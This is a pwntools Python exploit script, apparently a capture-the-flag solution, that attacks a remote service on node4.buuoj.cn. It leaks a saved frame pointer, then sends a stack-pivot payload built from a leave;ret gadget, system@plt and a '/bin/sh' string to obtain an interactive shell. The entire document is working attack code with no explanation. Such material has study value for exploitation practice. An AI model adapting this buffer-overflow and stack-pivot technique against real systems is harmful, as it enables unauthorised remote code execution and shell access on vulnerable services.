from pwn import *

context.log_level="debug"
#sh=process("./timu")
sh=remote("node4.buuoj.cn",25513)

leave_ret=p32(0x08048562)
system_plt=p32(0x08048400)

payload=0x28*b'a'
sh.send(payload)
sh.recvuntil(0x28*b'a')
saved_ebp=u32(sh.recv(4).ljust(4,b'\x00'))
#print("saved ebp =",hex(saved_ebp))
ebp_addr=saved_ebp-0x10

payload1=b'aaaa'+system_plt+b'aaaa'+p32(ebp_addr-0x28+16)+b"/bin/sh\0"
payload1=payload1.ljust(0x28,b'a')
payload1+=p32(ebp_addr-0x28)+leave_ret
sh.send(payload1)

sh.interactive()
